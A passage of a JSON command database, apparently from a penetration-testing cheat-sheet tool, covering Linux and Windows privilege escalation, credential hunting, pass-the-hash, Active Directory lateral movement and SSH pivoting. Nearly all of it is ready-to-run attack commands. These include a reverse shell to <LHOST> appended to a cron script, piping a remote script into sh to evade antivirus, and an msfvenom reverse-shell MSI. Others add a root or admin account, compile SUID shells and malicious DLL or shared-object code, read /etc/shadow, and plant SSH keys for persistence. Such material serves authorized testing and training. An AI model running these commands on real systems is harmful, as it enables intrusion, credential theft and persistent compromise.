                  "service --status-all 2>/dev/null",
                  "systemctl list-units --type=service --state=running",
                  "ps aux | grep root"
                ]
              }
            ]
          },
          {
            "desc": "Filesystems & mounts",
            "entries": [
              {
                "subdesc": "Mounted filesystems, fstab, block devices",
                "cmd": [
                  "cat /etc/fstab",
                  "mount",
                  "lsblk",
                  "lsmod"
                ]
              }
            ]
          },
          {
            "desc": "Writable systemd unit files",
            "entries": [
              {
                "subdesc": "If you can modify a unit file running as root → code execution",
                "cmd": [
                  "find /etc/systemd/system -writable -type f 2>/dev/null",
                  "find /lib/systemd/system -writable -type f 2>/dev/null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-5",
        "name": "Linux: Sudo Permissions",
        "description": "Assess sudo misconfigurations. Check GTFOBins for exploitable binaries.",
        "commands": [
          {
            "desc": "Check sudo rights",
            "entries": [
              {
                "subdesc": "GTFOBins: https://gtfobins.github.io/",
                "cmd": [
                  "sudo -l"
                ]
              },
              {
                "subdesc": "Check each binary against GTFOBins for shell escape",
                "cmd": [
                  "# Common abusable: vim, find, nmap, python, perl, ruby, less, awk, man, ftp"
                ]
              }
            ]
          },
          {
            "desc": "Sudo version exploits",
            "entries": [
              {
                "subdesc": "Check for vulnerable sudo version",
                "cmd": [
                  "sudo --version"
                ]
              },
              {
                "subdesc": "Known CVEs",
                "cmd": [
                  "# CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2 → heap overflow",
                  "# CVE-2019-14287: sudo -u#-1 /bin/bash → when (ALL, !root) is set"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-6",
        "name": "Linux: SUID/SGID Binaries",
        "description": "Find SUID/SGID binaries and cross-reference with GTFOBins for privilege escalation.",
        "commands": [
          {
            "desc": "Find SUID binaries",
            "entries": [
              {
                "subdesc": "Binaries that run as the file owner (usually root)",
                "cmd": [
                  "find / -type f -perm -u=s 2>/dev/null",
                  "find / -type f -perm -g=s 2>/dev/null",
                  "find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Writable /etc files",
            "entries": [
              {
                "subdesc": "Find writable files in /etc",
                "cmd": [
                  "find /etc -writable -type f 2>/dev/null"
                ]
              },
              {
                "subdesc": "If /etc/passwd writable — add root user",
                "cmd": [
                  "openssl passwd -1 -salt xyz password123",
                  "echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-7",
        "name": "Linux: Capabilities",
        "description": "Check Linux capabilities that can be abused for privilege escalation (e.g., cap_setuid on python/perl).",
        "commands": [
          {
            "desc": "Enumerate capabilities",
            "entries": [
              {
                "subdesc": "Capabilities allow fine-grained root powers on individual binaries",
                "cmd": [
                  "getcap -r / 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Abuse cap_setuid (python example)",
            "entries": [
              {
                "subdesc": "If python has cap_setuid → instant root",
                "cmd": [
                  "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                ]
              },
              {
                "subdesc": "Other abusable capabilities",
                "cmd": [
                  "# perl: perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'",
                  "# Also check: cap_dac_read_search (read any file), cap_net_raw, cap_sys_admin"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-8",
        "name": "Linux: Cron Jobs & Scheduled Tasks",
        "description": "Find cron jobs running as root with writable scripts or wildcard injection opportunities.",
        "commands": [
          {
            "desc": "Enumerate cron jobs",
            "entries": [
              {
                "subdesc": "System and user cron jobs",
                "cmd": [
                  "crontab -l",
                  "cat /etc/crontab",
                  "ls -la /etc/cron.d/",
                  "ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/",
                  "cat /var/spool/cron/crontabs/* 2>/dev/null",
                  "systemctl list-timers --all 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Wildcard TAR injection",
            "entries": [
              {
                "subdesc": "If cron runs tar with wildcard (*) in a writable directory → code execution",
                "cmd": [
                  "echo '' > '--checkpoint=1'",
                  "echo '' > '--checkpoint-action=exec=sh shell.sh'",
                  "echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh"
                ]
              }
            ]
          },
          {
            "desc": "Writable cron scripts",
            "entries": [
              {
                "subdesc": "Check permissions on scripts referenced in cron",
                "cmd": [
                  "ls -la /path/to/cron/script.sh"
                ]
              },
              {
                "subdesc": "If a cron script is writable — inject reverse shell",
                "cmd": [
                  "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /path/to/writable_cron_script.sh"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-9",
        "name": "Linux: Password Hunting",
        "description": "Search the filesystem for cleartext passwords and credentials in config files, logs, and history.",
        "commands": [
          {
            "desc": "Grep for passwords",
            "entries": [
              {
                "subdesc": "Search common file locations for credentials",
                "cmd": [
                  "grep -Ri 'password' /etc/ /var/ /opt/ /home/ 2>/dev/null | head -50",
                  "grep -Ri 'passwd\\|pass=' /var/www/ /opt/ 2>/dev/null",
                  "find / -name '*.config' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -li 'pass' 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Locate sensitive files",
            "entries": [
              {
                "subdesc": "Database configs, web configs, SSH keys",
                "cmd": [
                  "locate password 2>/dev/null | head -20",
                  "find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' -o -name 'web.config' 2>/dev/null",
                  "cat /var/www/html/wp-config.php 2>/dev/null",
                  "cat /opt/*/.env 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Database secrets",
            "entries": [
              {
                "subdesc": "Extract creds for lateral movement into data services",
                "cmd": [
                  "grep -R \"password\\|passwd\\|DB_\" /var/www /opt /home 2>/dev/null",
                  "cat /etc/*conf 2>/dev/null | grep -Ei \"mysql|postgres|redis|mongo\"",
                  "find / -name '*.sql' -o -name '*.sqlite' -o -name '*.db' 2>/dev/null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-10",
        "name": "Linux: Kernel Exploits",
        "description": "Identify kernel version and match against known local privilege escalation exploits.",
        "commands": [
          {
            "desc": "Kernel version identification",
            "entries": [
              {
                "subdesc": "Match against exploit databases",
                "cmd": [
                  "uname -r",
                  "uname -a",
                  "cat /proc/version",
                  "searchsploit linux kernel <VERSION>"
                ]
              }
            ]
          },
          {
            "desc": "Common kernel exploits",
            "entries": [
              {
                "subdesc": "Well-known kernel privesc exploits",
                "cmd": [
                  "# DirtyPipe CVE-2022-0847: kernel 5.8 - 5.16.11",
                  "# DirtyCow CVE-2016-5195: kernel 2.x - 4.x",
                  "# PwnKit CVE-2021-4034: pkexec polkit SUID",
                  "# GameOver(lay) CVE-2023-2640 / CVE-2023-32629: Ubuntu OverlayFS"
                ]
              }
            ]
          },
          {
            "desc": "Automated exploit suggestion",
            "entries": [
              {
                "subdesc": "Linux Exploit Suggester",
                "cmd": [
                  "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
                  "chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-11",
        "name": "Linux: Automated Enumeration Tools",
        "description": "Run automated privilege escalation enumeration scripts. Multiple transfer methods for restricted environments.",
        "commands": [
          {
            "desc": "LinPEAS",
            "entries": [
              {
                "subdesc": "Transfer methods",
                "cmd": [
                  "wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh",
                  "curl http://<LHOST>/linpeas.sh -o /tmp/linpeas.sh"
                ]
              },
              {
                "subdesc": "Netcat transfer (if wget/curl unavailable)",
                "cmd": [
                  "# Attacker: nc -lvnp 9999 < linpeas.sh",
                  "# Target:   cat < /dev/tcp/<LHOST>/9999 > /tmp/linpeas.sh"
                ]
              },
              {
                "subdesc": "AV bypass — run from memory (no file on disk)",
                "cmd": [
                  "curl http://<LHOST>/linpeas.sh | sh"
                ]
              },
              {
                "subdesc": "Execute",
                "cmd": [
                  "./linpeas.sh -a 2>&1 | tee linpeas_output.txt"
                ]
              }
            ]
          },
          {
            "desc": "Other tools",
            "entries": [
              {
                "subdesc": "LinEnum",
                "cmd": [
                  "wget http://<LHOST>/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -t"
                ]
              },
              {
                "subdesc": "linux-exploit-suggester (perl)",
                "cmd": [
                  "wget http://<LHOST>/linux-exploit-suggester.sh && ./linux-exploit-suggester.sh"
                ]
              },
              {
                "subdesc": "unix-privesc-check",
                "cmd": [
                  "wget http://<LHOST>/unix-privesc-check && chmod +x unix-privesc-check && ./unix-privesc-check standard"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-12",
        "name": "Linux: NFS & Shared Filesystems",
        "description": "Check NFS exports for no_root_squash misconfiguration — mount share, create SUID binary as root.",
        "commands": [
          {
            "desc": "Enumerate NFS shares",
            "entries": [
              {
                "subdesc": "Check for exported shares and mount options",
                "cmd": [
                  "showmount -e <TARGET_IP>",
                  "cat /etc/exports 2>/dev/null"
                ]
              },
              {
                "subdesc": "Look for no_root_squash → root on client = root on share",
                "cmd": [
                  "# Look for no_root_squash in the exports file output above"
                ]
              }
            ]
          },
          {
            "desc": "NFS Root Squashing exploit",
            "entries": [
              {
                "subdesc": "On attacker (as root) — mount NFS share",
                "cmd": [
                  "mkdir /tmp/nfs && mount -t nfs <TARGET>:/<share> /tmp/nfs"
                ]
              },
              {
                "subdesc": "Compile SUID shell",
                "cmd": [
                  "echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > /tmp/nfs/shell.c",
                  "gcc /tmp/nfs/shell.c -o /tmp/nfs/shell",
                  "chmod u+s /tmp/nfs/shell"
                ]
              },
              {
                "subdesc": "On target — execute for root shell",
                "cmd": [
                  "/mount/path/shell"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-13",
        "name": "Linux: Path Hijacking",
        "description": "Exploit scripts or SUID binaries that call commands without full path — hijack via PATH manipulation.",
        "commands": [
          {
            "desc": "Relative path hijack",
            "entries": [
              {
                "subdesc": "Find target — identify binaries calling commands without full path",
                "cmd": [
                  "strings /usr/local/bin/suid-binary | grep -v '/'"
                ]
              },
              {
                "subdesc": "Create fake binary and hijack PATH",
                "cmd": [
                  "echo '/bin/bash' > /tmp/service",
                  "chmod +x /tmp/service",
                  "export PATH=/tmp:$PATH",
                  "/usr/local/bin/suid-binary"
                ]
              }
            ]
          },
          {
            "desc": "Absolute path hijack (LD_PRELOAD)",
            "entries": [
              {
                "subdesc": "Check if LD_PRELOAD is preserved",
                "cmd": [
                  "sudo -l"
                ]
              },
              {
                "subdesc": "Compile preload library",
                "cmd": [
                  "echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }' > /tmp/pe.c",
                  "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles",
                  "sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-14",
        "name": "Linux: Shared Object Injection",
        "description": "If a SUID binary loads a missing shared object (.so) from a writable path — inject malicious library.",
        "commands": [
          {
            "desc": "Find missing shared objects",
            "entries": [
              {
                "subdesc": "Use strace to identify missing .so files",
                "cmd": [
                  "strace /usr/local/bin/suid-binary 2>&1 | grep -i 'no such file'"
                ]
              },
              {
                "subdesc": "Look for writable paths in output",
                "cmd": [
                  "# Look for: open(\"/writable/path/lib.so\", ...) = -1 ENOENT"
                ]
              }
            ]
          },
          {
            "desc": "Compile malicious shared object",
            "entries": [
              {
                "subdesc": "Create .so that spawns a root shell when loaded",
                "cmd": [
                  "echo '#include <stdio.h>\\n#include <stdlib.h>\\nstatic void inject() __attribute__((constructor));\\nvoid inject() { setuid(0); setgid(0); system(\"/bin/bash -p\"); }' > /tmp/exploit.c",
                  "gcc -shared -fPIC -o /writable/path/lib.so /tmp/exploit.c",
                  "/usr/local/bin/suid-binary → loads malicious .so → root"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-15",
        "name": "Linux: Docker Escalation",
        "description": "If current user is in the docker group — mount host filesystem to escape container and get root.",
        "commands": [
          {
            "desc": "Check docker group membership",
            "entries": [
              {
                "subdesc": "Docker group = effectively root on host",
                "cmd": [
                  "id | grep docker",
                  "groups"
                ]
              }
            ]
          },
          {
            "desc": "Docker root escape",
            "entries": [
              {
                "subdesc": "Mount host filesystem inside container",
                "cmd": [
                  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                ]
              },
              {
                "subdesc": "Read /etc/shadow",
                "cmd": [
                  "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow"
                ]
              },
              {
                "subdesc": "Add SSH key for persistence",
                "cmd": [
                  "docker run -v /root:/mnt --rm alpine sh -c 'echo <pub_key> >> /mnt/.ssh/authorized_keys'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-16",
        "name": "Linux: Domain-Joined Enumeration",
        "description": "If the Linux host is joined to AD — enumerate domain users and realm information.",
        "commands": [
          {
            "desc": "Realm & domain info",
            "entries": [
              {
                "subdesc": "Check if host is domain-joined",
                "cmd": [
                  "realm list",
                  "adcli info <domain>",
                  "cat /etc/krb5.conf 2>/dev/null",
                  "klist 2>/dev/null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-17",
        "name": "Windows: User Enumeration",
        "description": "Identify current user privileges, groups, other users, and command history for credential discovery.",
        "commands": [
          {
            "desc": "Current user context",
            "entries": [
              {
                "subdesc": "Privileges, groups, and token info",
                "cmd": [
                  "whoami",
                  "whoami /priv",
                  "whoami /groups",
                  "net user %username%"
                ]
              }
            ]
          },
          {
            "desc": "All users & groups",
            "entries": [
              {
                "subdesc": "Enumerate local users and group memberships",
                "cmd": [
                  "net user",
                  "net localgroup",
                  "net localgroup Administrators",
                  "Get-LocalUser | ft Name,Enabled,LastLogon",
                  "Get-LocalGroupMember -Group 'Administrators'"
                ]
              }
            ]
          },
          {
            "desc": "Command history & saved credentials",
            "entries": [
              {
                "subdesc": "PowerShell history and saved sessions",
                "cmd": [
                  "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                  "(Get-PSReadlineOption).HistorySavePath",
                  "Get-History",
                  "cmdkey /list"
                ]
              },
              {
                "subdesc": "Use saved creds",
                "cmd": [
                  "runas /savecred /user:<user> cmd.exe"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-18",
        "name": "Windows: System Enumeration",
        "description": "Identify OS version, architecture, hotfixes, and installed software for exploit matching.",
        "commands": [
          {
            "desc": "System information",
            "entries": [
              {
                "subdesc": "OS, architecture, hotfixes",
                "cmd": [
                  "systeminfo",
                  "hostname",
                  "[System.Environment]::OSVersion.Version",
                  "wmic os get Caption,Version,BuildNumber,OSArchitecture",
                  "wmic qfe get Caption,Description,HotFixID,InstalledOn"
                ]
              }
            ]
          },
          {
            "desc": "Installed software",
            "entries": [
              {
                "subdesc": "Check for vulnerable application versions",
                "cmd": [
                  "wmic product get name,version,vendor",
                  "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion",
                  "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-19",
        "name": "Windows: Network Enumeration",
        "description": "Discover network configuration, listening ports, routes, and ARP table for pivot opportunities.",
        "commands": [
          {
            "desc": "Network configuration",
            "entries": [
              {
                "subdesc": "Interfaces, DNS, domain info",
                "cmd": [
                  "ipconfig /all",
                  "route print",
                  "arp -a"
                ]
              }
            ]
          },
          {
            "desc": "Listening services & connections",
            "entries": [
              {
                "subdesc": "Internal services that may be exploitable",
                "cmd": [
                  "netstat -ano",
                  "netstat -ano | findstr LISTENING",
                  "netstat -ano | findstr ESTABLISHED"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-20",
        "name": "Windows: Service Enumeration",
        "description": "Enumerate running services, scheduled tasks, vault credentials, and firewall status.",
        "commands": [
          {
            "desc": "Services & processes",
            "entries": [
              {
                "subdesc": "Running services and their binary paths",
                "cmd": [
                  "wmic service get name,displayname,pathname,startmode",
                  "tasklist /SVC",
                  "sc query state= all",
                  "sc qc <SERVICE_NAME>"
                ]
              }
            ]
          },
          {
            "desc": "Credential vault & DPAPI",
            "entries": [
              {
                "subdesc": "Check Windows credential storage",
                "cmd": [
                  "vaultcmd /listcreds:\"Windows Credentials\" /all",
                  "cmdkey /list"
                ]
              }
            ]
          },
          {
            "desc": "Firewall & AV status",
            "entries": [
              {
                "subdesc": "Check security controls",
                "cmd": [
                  "sc query windefend",
                  "netsh advfirewall show allprofiles",
                  "netsh advfirewall firewall show rule name=all | more",
                  "Get-MpComputerStatus 2>$null"
                ]
              }
            ]
          },
          {
            "desc": "GPO enumeration",
            "entries": [
              {
                "subdesc": "Group Policy Objects applied to host",
                "cmd": [
                  "gpresult /r",
                  "Get-GPO -All 2>$null",
                  "Get-GPPermission -All -TargetType Computer -TargetName $env:COMPUTERNAME 2>$null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-21",
        "name": "Windows: Automated Enumeration Tools",
        "description": "Run WinPEAS, PowerUp, PrivescCheck for comprehensive automated privilege escalation scanning.",
        "commands": [
          {
            "desc": "WinPEAS",
            "entries": [
              {
                "subdesc": "Transfer methods",
                "cmd": [
                  "certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe",
                  "iwr http://<LHOST>/winPEASx64.exe -OutFile C:\\Temp\\winpeas.exe"
                ]
              },
              {
                "subdesc": "Execute",
                "cmd": [
                  ".\\winpeas.exe > winpeas_output.txt"
                ]
              }
            ]
          },
          {
            "desc": "PowerUp.ps1",
            "entries": [
              {
                "subdesc": "PowerShell privesc enumeration — finds service misconfigs, DLL hijack, etc.",
                "cmd": [
                  "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
                  "Get-ModifiableServiceFile",
                  "Get-UnquotedService",
                  "Get-ModifiablePath"
                ]
              }
            ]
          },
          {
            "desc": "PrivescCheck",
            "entries": [
              {
                "subdesc": "Modern PowerShell privesc checker",
                "cmd": [
                  "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,HTML\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-22",
        "name": "Windows: Service Binary Hijacking",
        "description": "Find services with writable binary paths. Replace the binary with a payload to execute as SYSTEM on restart.",
        "commands": [
          {
            "desc": "Find vulnerable services",
            "entries": [
              {
                "subdesc": "Query services and check running state",
                "cmd": [
                  "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
                ]
              },
              {
                "subdesc": "Check permissions on service binary (look for F or M for current user)",
                "cmd": [
                  "icacls \"C:\\path\\to\\service.exe\""
                ]
              },
              {
                "subdesc": "Permission mask reference",
                "cmd": [
                  "# F=Full, M=Modify, RX=ReadExecute, R=Read, W=Write"
                ]
              }
            ]
          },
          {
            "desc": "Exploit — replace binary",
            "entries": [
              {
                "subdesc": "Source code (adduser.c)",
                "cmd": [
                  "# #include <stdlib.h> int main() { system(\"net user hacker Password123! /add && net localgroup Administrators hacker /add\"); return 0; }"
                ]
              },
              {
                "subdesc": "Compile payload",
                "cmd": [
                  "x86_64-w64-mingw32-gcc adduser.c -o adduser.exe"
                ]
              },
              {
                "subdesc": "Replace service binary",
                "cmd": [
                  "move C:\\path\\to\\service.exe service.exe.bak",
                  "copy adduser.exe C:\\path\\to\\service.exe",
                  "net stop <service> && net start <service>"
                ]
              },
              {
                "subdesc": "PowerUp automated",
                "cmd": [
                  "Install-ServiceBinary -Name '<service>'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-23",
        "name": "Windows: DLL Hijacking",
        "description": "Exploit DLL search order — if a service loads a missing DLL from a writable path, place a malicious DLL there.",
        "commands": [
          {
            "desc": "DLL search order",
            "entries": [
              {
                "subdesc": "Windows searches for DLLs in this order — hijack at writable location",
                "cmd": [
                  "# 1. Directory of the application",
                  "# 2. C:\\Windows\\System32",
                  "# 3. C:\\Windows\\System",
                  "# 4. C:\\Windows",
                  "# 5. Current working directory",
                  "# 6. PATH environment variable directories"
                ]
              }
            ]
          },
          {
            "desc": "Discovery with Procmon",
            "entries": [
              {
                "subdesc": "Use Process Monitor to find missing DLLs (NAME NOT FOUND results)",
                "cmd": [
                  "# Procmon filters:",
                  "# Operation: CreateFile, Result: NAME NOT FOUND, Path ends with: .dll",
                  "# Restart the target service and observe which DLLs are missing"
                ]
              }
            ]
          },
          {
            "desc": "Create malicious DLL",
            "entries": [
              {
                "subdesc": "C++ DLL source",
                "cmd": [
                  "# malicious.cpp: BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { if (reason == DLL_PROCESS_ATTACH) { system(\"cmd /c net user hacker Password123! /add && net localgroup Administrators hacker /add\"); } return TRUE; }"
                ]
              },
              {
                "subdesc": "Compile and deploy",
                "cmd": [
                  "x86_64-w64-mingw32-gcc malicious.cpp --shared -o malicious.dll"
                ]
              },
              {
                "subdesc": "Copy to writable location in DLL search path",
                "cmd": [
                  "# Place malicious.dll in a writable folder that appears in the DLL search order"
                ]
              },
              {
                "subdesc": "Restart service",
                "cmd": [
                  "net stop <service> && net start <service>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-24",
        "name": "Windows: Unquoted Service Paths",
        "description": "If a service path has spaces and is unquoted, Windows will try shorter paths first — place malicious exe at those paths.",
        "commands": [
          {
            "desc": "Find unquoted service paths",
            "entries": [
              {
                "subdesc": "Look for paths with spaces that are NOT wrapped in quotes",
                "cmd": [
                  "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\""
                ]
              },
              {
                "subdesc": "How Windows resolves unquoted paths",
                "cmd": [
                  "# Example: C:\\Program Files\\My App\\service.exe",
                  "# Windows tries: C:\\Program.exe → C:\\Program Files\\My.exe → C:\\Program Files\\My App\\service.exe"
                ]
              }
            ]
          },
          {
            "desc": "Exploit — place binary at shorter path",
            "entries": [
              {
                "subdesc": "Check write permissions on parent directories",
                "cmd": [
                  "icacls \"C:\\Program Files\\My App\""
                ]
              },
              {
                "subdesc": "If writable, place payload",
                "cmd": [
                  "copy payload.exe \"C:\\Program Files\\My.exe\"",
                  "net stop <service> && net start <service>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-25",
        "name": "Windows: Scheduled Tasks PrivEsc",
        "description": "Find scheduled tasks running as SYSTEM with writable scripts or binary paths.",
        "commands": [
          {
            "desc": "Enumerate scheduled tasks",
            "entries": [
              {
                "subdesc": "List all tasks and details",
                "cmd": [
                  "schtasks /query /fo LIST /v"
                ]
              },
              {
                "subdesc": "Focus on key fields",
                "cmd": [
                  "# - Task To Run: path to script/binary",
                  "# - Run As User: SYSTEM or high-priv account",
                  "# - Schedule Type: when does it run"
                ]
              },
              {
                "subdesc": "Check permissions on the binary/script",
                "cmd": [
                  "icacls \"C:\\path\\to\\scheduled\\script.bat\""
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-26",
        "name": "Windows: AlwaysInstallElevated",
        "description": "If both HKLM and HKCU AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM.",
        "commands": [
          {
            "desc": "Check registry keys",
            "entries": [
              {
                "subdesc": "Both keys must be set to 1 for exploitation",
                "cmd": [
                  "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                  "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
                ]
              }
            ]
          },
          {
            "desc": "Exploit — generate and install malicious MSI",
            "entries": [
              {
                "subdesc": "Create MSI payload with msfvenom, install for SYSTEM shell",
                "cmd": [
                  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
                  "msiexec /quiet /qn /i C:\\Temp\\shell.msi"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-27",
        "name": "Windows: Token Impersonation",
        "description": "Check for SeImpersonate/SeAssignPrimaryToken privileges — abuse with potato exploits or Meterpreter incognito.",
        "commands": [
          {
            "desc": "Check privileges",
            "entries": [
              {
                "subdesc": "List current user privileges",
                "cmd": [
                  "whoami /priv"
                ]
              },
              {
                "subdesc": "Key privileges to look for",
                "cmd": [
                  "# SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege"
                ]
              }
            ]
          },
          {
            "desc": "Potato exploits",
            "entries": [
              {
                "subdesc": "Exploit SeImpersonate to get SYSTEM",
                "cmd": [
                  "PrintSpoofer.exe -i -c powershell.exe",
                  "GodPotato.exe -cmd \"cmd /c <payload>\"",
                  "JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -a \"/c <payload>\" -t *",
                  "RoguePotato.exe -r <LHOST> -e \"cmd /c <payload>\" -l 9999"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-28",
        "name": "Windows: Stored Credentials & Pass the Hash",
        "description": "Extract stored credentials and use NTLM hashes for lateral movement.",
        "commands": [
          {
            "desc": "Stored credentials",
            "entries": [
              {
                "subdesc": "Windows credential manager and saved sessions",
                "cmd": [
                  "cmdkey /list",
                  "runas /savecred /user:<domain>\\<user> cmd.exe",
                  "vaultcmd /listcreds:\"Windows Credentials\" /all"
                ]
              }
            ]
          },
          {
            "desc": "Pass the Hash",
            "entries": [
              {
                "subdesc": "Use NTLM hash without knowing plaintext password",
                "cmd": [
                  "impacket-psexec <domain>/<user>@<TARGET_IP> -hashes :<NTLM_HASH>",
                  "impacket-wmiexec <domain>/<user>@<TARGET_IP> -hashes :<NTLM_HASH>",
                  "evil-winrm -i <TARGET_IP> -u <user> -H <NTLM_HASH>",
                  "nxc smb <TARGET_IP> -u <user> -H <NTLM_HASH>",
                  "nxc winrm <TARGET_IP> -u <user> -H <NTLM_HASH>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-29",
        "name": "Windows: AD Enumeration from Host",
        "description": "Deep Active Directory enumeration and trust analysis from a compromised domain-joined host.",
        "commands": [
          {
            "desc": "Domain information",
            "entries": [
              {
                "subdesc": "Basic domain and DC enumeration",
                "cmd": [
                  "nltest /dclist:<DOMAIN>",
                  "nltest /domain_trusts",
                  "Get-ADDomain",
                  "Get-ADForest"
                ]
              }
            ]
          },
          {
            "desc": "User & group enumeration",
            "entries": [
              {
                "subdesc": "Domain users, groups, admins",
                "cmd": [
                  "net user /domain",
                  "net group \"Domain Admins\" /domain",
                  "net group \"Enterprise Admins\" /domain",
                  "Get-ADUser -Filter * -Properties * | Select SamAccountName,Description,MemberOf",
                  "Get-ADGroupMember -Identity 'Domain Admins' -Recursive"
                ]
              }
            ]
          },
          {
            "desc": "SMB Lateral Movement",
            "entries": [
              {
                "subdesc": "Enumerate reachable hosts and admin shares",
                "cmd": [
                  "net view /domain",
                  "net use \\\\<TARGET_IP>\\C$ /user:<DOMAIN>\\<USER> <PASS>",
                  "nxc smb <subnet>/24 -u <user> -p <pass>"
                ]
              }
            ]
          },
          {
            "desc": "WinRM Lateral Movement",
            "entries": [
              {
                "subdesc": "PowerShell remoting for post-exploitation",
                "cmd": [
                  "Test-WSMan <TARGET_IP>",
                  "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>",
                  "Enter-PSSession -ComputerName <TARGET> -Credential <domain>\\<user>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-30",
        "name": "Pivoting: SSH Tunneling",
        "description": "Create SSH tunnels to pivot through compromised hosts and access internal networks.",
        "commands": [
          {
            "desc": "Local port forward",
            "entries": [
              {
                "subdesc": "Forward local port to remote service through SSH host",
                "cmd": [
                  "ssh -L <LPORT>:<target_internal_ip>:<target_port> user@<pivot_host>"
                ]
              },
              {
                "subdesc": "Example",
                "cmd": [
                  "# ssh -L 8080:10.10.10.5:80 user@pivot → access 10.10.10.5:80 via localhost:8080"
                ]
              }
            ]
          },
          {
            "desc": "Remote port forward",
            "entries": [
              {
                "subdesc": "Forward remote port back to attacker — useful for reverse shells through pivot",
                "cmd": [
                  "ssh -R <RPORT>:127.0.0.1:<LPORT> user@<attacker_ip>"
                ]
              },
              {
                "subdesc": "Example",
                "cmd": [
                  "# ssh -R 9999:127.0.0.1:80 kali@10.10.14.5 → pivot's port 80 accessible on kali:9999"
                ]
              }
            ]
          },
          {
            "desc": "Dynamic port forward (SOCKS proxy)",
            "entries": [
              {
                "subdesc": "Create SOCKS4/5 proxy",
                "cmd": [
                  "ssh -D 1080 user@<pivot_host>"
                ]
              },
              {
                "subdesc": "Configure proxychains",
                "cmd": [
                  "# Edit /etc/proxychains4.conf → socks5 127.0.0.1 1080"
                ]
              },
              {
                "subdesc": "Route traffic through proxy",
                "cmd": [
                  "proxychains nmap -sT -Pn <internal_target>",
                  "proxychains curl http://<internal_target>"
                ]
              }
            ]
          },
          {
            "desc": "Remote dynamic port forward",
            "entries": [
              {
                "subdesc": "Create SOCKS proxy (OpenSSH 7.6+)",
                "cmd": [
                  "ssh -R 1080 user@<attacker_ip>"
                ]
              },
              {
                "subdesc": "Result",
                "cmd": [
                  "# SOCKS proxy created on attacker's port 1080"
                ]
              }
            ]
